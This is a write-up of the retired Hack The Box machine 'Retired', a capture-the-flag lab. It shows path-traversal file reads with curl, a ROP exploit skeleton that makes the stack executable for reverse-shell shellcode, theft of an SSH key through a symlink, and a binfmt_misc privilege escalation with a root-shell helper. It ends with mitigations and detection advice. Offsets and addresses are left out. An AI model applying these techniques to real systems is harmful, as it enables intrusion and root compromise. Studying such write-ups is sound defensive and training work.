---
machine: Retired
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
pwned: null
tags: [linux, web, file-read, buffer-overflow, rop, binfmt-misc, capabilities]
---

# Retired — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired (13 Aug 2022). Reference writeup; not played on this profile.
> No flags, offsets or real ROP addresses.

## TL;DR

A PHP `readfile()` lets you read arbitrary files and download the `activate_license` binary. The binary listens on a local port, receives a file and copies an attacker-controlled length into a 512-byte buffer: a stack overflow. ROP calls `mprotect` to make the stack executable, then jumps to shellcode. From the `www-data` shell, a symlink in the backup directory yields `dev`'s SSH key. Privilege escalation abuses `binfmt_misc`: `reg_helper` has `cap_dac_override` and can register an interpreter with the `C` flag, which inherits the credentials of a setuid binary.

## Recon

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 22,80 <TARGET_IP>
```

| Port | Service | Note |
|---|---|---|
| 22/tcp | SSH | Later access as `dev` |
| 80/tcp | HTTP | PHP with `index.php?page=` |

## Web enumeration

```bash
feroxbuster -u http://<TARGET_IP> -x php,html
curl -s 'http://<TARGET_IP>/index.php?page=index' | head
```

`page` is concatenated into a path and served with `readfile()`. This is not an LFI that executes PHP: the contents are printed, not interpreted. Repeating `.....///` walks out of the web root.

```bash
curl -s 'http://<TARGET_IP>/index.php?page=css/.....///.....///.....///.....///etc/passwd'
```

The page mentions `activate_license`. Locate and download it:

```bash
curl -s 'http://<TARGET_IP>/index.php?page=css/.....///.....///.....///.....///usr/bin/activate_license' \
  -o activate_license
file activate_license
checksec --file=activate_license
```

## Foothold

### 1. Understand the binary

`activate_license` opens a local socket, reads a 4-byte length and copies that many bytes into a 512-byte buffer. The length is not validated: a classic overflow.

```bash
strings -a activate_license | head -40
objdump -d -M intel activate_license | grep -A20 '<main>'
```

The web app has `activate_license.php`, which uploads a file and forwards it to the process. The PID changes on every boot; find it by reading `/proc/<pid>/cmdline` through the file read.

```bash
for p in $(seq 1 2000); do
  curl -s "http://<TARGET_IP>/index.php?page=css/.....///.....///.....///.....///proc/$p/cmdline" \
    | grep -q activate_license && echo "PID=$p"
done
```

With the PID, read `/proc/<pid>/maps` and `/proc/<pid>/stack` to get library bases.

### 2. Build the exploit

Typical protections: NX enabled, no useful canary in this function, PIE on the binary but libraries mapped at known addresses. Strategy:

1. Fill up to the return address.
2. `pop rdi; ret`, `pop rsi; ret`, `pop rdx; ret` for arguments.
3. Call `mprotect(stack_page, 0x1000, PROT_READ|WRITE|EXEC)`.
4. Jump to `jmp rsp`.
5. Reverse-shell shellcode.

```python
payload  = b'A' * offset
payload += p64(pop_rdi) + p64(stack_page)
payload += p64(pop_rsi) + p64(0x1000)
payload += p64(pop_rdx) + p64(7)
payload += p64(mprotect)
payload += p64(jmp_rsp)
payload += shellcode
```

Upload the payload through `activate_license.php` and catch the shell as `www-data`. No concrete offsets or addresses are published: they depend on the binary and the boot.

## Lateral movement / user

A backup script runs as `dev` and archives the web directory. The directory is writable by `www-data`, so place a symlink to `/home/dev/.ssh`:

```bash
ln -s /home/dev/.ssh /var/www/html/.ssh
```

The next backup includes the private key. Download the archive, extract it and use it over SSH:

```bash
tar -xf backup.tar.gz
chmod 600 id_rsa
ssh -i id_rsa dev@<TARGET_IP>
```

## Privilege escalation

```bash
getcap /usr/lib/emuemu/reg_helper
# cap_dac_override=ep
```

`reg_helper` reads stdin and writes to `/proc/sys/fs/binfmt_misc/register` with `cap_dac_override`, so it can register formats even for a non-root user. Compile an interpreter that launches bash:

```c
#include <unistd.h>
int main(void) {
    setresuid(0, 0, 0);
    char *argv[] = {"/bin/bash", "-p", NULL};
    execve(argv[0], argv, NULL);
    return 1;
}
```

```bash
gcc -o /dev/shm/h handler.c
```

Register a rule matching the first bytes of a setuid binary (`newgrp`) and use the `C` flag:

```bash
MAGIC=$(head -c 30 /usr/bin/newgrp | xxd -p | sed 's/../\\x&/g')
echo ":x:M::$MAGIC::/dev/shm/h:C" | /usr/lib/emuemu/reg_helper
newgrp
```

`C` makes `binfmt_misc` apply the **binary's** credentials (setuid root), not the interpreter's. Running `newgrp` makes the kernel call `/dev/shm/h` as root. Cleanup:

```bash
echo -1 > /proc/sys/fs/binfmt_misc/x
```

## Evidence

- `readfile()` returning `/etc/passwd` and the binary.
- `checksec` and disassembly of the vulnerable function.
- `www-data` shell and later SSH as `dev`.
- `getcap` on `reg_helper`.
- `id` as root after running `newgrp`.

## Lessons learned

- A file read without execution is still critical: it downloads binaries and reads `/proc`.
- The overflow is not in the web service but in a local binary the web app can feed.
- A backup that follows symlinks turns a writable directory into SSH key disclosure.
- `binfmt_misc` with `C` is an escalation path when a capability-bearing helper writes to `register`.
- `cap_dac_override` on a binary that writes a kernel file is effectively root.

## Mitigations and detection

- Validate length before `read()` and use safe functions; build with `-fstack-protector-all`, `-D_FORTIFY_SOURCE=2`, PIE and full RELRO.
- Do not run backups as a user with key access; use `tar --no-recursion` and do not follow symlinks.
- Audit capabilities (`getcap -r /`) and remove `cap_dac_override` from helpers.
- Detection: writes to `/proc/sys/fs/binfmt_misc/register`, interpreters executed from `/dev/shm`, unusual `newgrp` and processes with `cap_dac_override`.
- Audit changes to web directories and backups.

MITRE: T1190, T1068, T1548, T1552.004.

## References

- <https://0xdf.gitlab.io/2022/08/13/htb-retired.html>
- <https://man7.org/linux/man-pages/man5/binfmt_misc.5.html>
- <https://man7.org/linux/man-pages/man7/capabilities.7.html>
